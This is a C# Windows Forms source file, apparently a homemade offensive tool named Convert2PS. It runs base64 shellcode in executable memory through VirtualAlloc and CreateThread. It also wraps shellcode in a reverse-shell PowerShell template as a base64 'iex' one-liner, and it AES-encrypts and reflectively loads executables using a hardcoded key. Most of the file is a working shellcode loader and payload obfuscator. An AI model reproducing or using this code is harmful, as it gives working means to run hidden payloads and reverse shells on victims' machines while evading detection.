using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Convert2PS
{


    public partial class Form1 : Form
    {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        private uint MEM_COMMIT = 0x00001000;
        private uint MEM_RESERVE = 0x00002000;
        private uint PAGE_EXECUTE_READWRITE = 0x40;


        public Form1()
        {
            InitializeComponent();

            //System.Diagnostics.Process.Start()
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Run(this.txtbase64.Text);
        }

        private void Run(string base64)
        {
            try
            {
                byte[] buf = Convert.FromBase64String(base64.Trim());

                IntPtr handle = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                Marshal.Copy(buf, 0, handle, buf.Length);

                IntPtr thread = CreateThread(IntPtr.Zero, 0, handle, IntPtr.Zero, 0, IntPtr.Zero);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //OpenFileDialog dialog = new OpenFileDialog();

            //if (dialog.ShowDialog() == DialogResult.OK)
            //{
            //    string originalfile = dialog.FileName;
            //    SaveFileDialog savedialog = new SaveFileDialog();

            //    string targetfile = savedialog.FileName;


            //}


            Crypto.FileEncrypt(@"D:\Codigo Fuente\Convert2PS\DemoExec\bin\Debug\DemoExec.exe", @"c:\temp\DemoExec.aes", "wsT%zQ71e7em&0F9GqPOQD0h7#4Bg*Ls");

            byte[] file = Crypto.FileDecrypt(@"c:\temp\DemoExec.aes", "wsT%zQ71e7em&0F9GqPOQD0h7#4Bg*Ls");

            

            File.WriteAllBytes(@"c:\temp\DemoExec2.exe", file);

            Assembly asm = System.Reflection.Assembly.Load(file);
            

            //this.Run(file);

            //string c = Crypto.Encrypt("wsT %zQ71e7em&0F9GqPOQD0h7#4Bg*Ls", "p8Sf^5u1&4ZBJ4#P", "prueba");
            //string d = Crypto.DecryptStringFromBytes_Aes("wsT%zQ71e7em&0F9GqPOQD0h7#4Bg*Ls", "p8Sf^5u1&4ZBJ4#P", c);

            
            //if (dialog.ShowDialog() == DialogResult.OK)
            //{
            //    string path = dialog.FileName;
            //    byte[] payload = Convert.FromBase64String(this.txtbase64.Text);
            //    File.WriteAllBytes(path, payload);
            //    MessageBox.Show("Process Complete");
            //}
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string templatePath = Path.Combine(Environment.CurrentDirectory, "pstemplates", "ReverseShell1.txt");
            if (File.Exists(templatePath))
            {
                string content = File.ReadAllText(templatePath);
                content = content.Replace("%%shellcode%%", this.txtbase64.Text);
                byte[] bcontent = Encoding.Default.GetBytes(content);
                string psb64 = Convert.ToBase64String(bcontent); ;
                string psexecute = $"$base64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"{psb64}\"));";
                psexecute += "iex $base64";

                this.txtbase64.Text = psexecute;
            }
            else
            {
                MessageBox.Show($"The path {templatePath} does not exists");
            }
        }

        private void cmdRunBinary_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog();
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                byte[] content =  File.ReadAllBytes(dialog.FileName);
                string base64 = Convert.ToBase64String(content);
                this.Run(base64);
            }
        }
    }
}
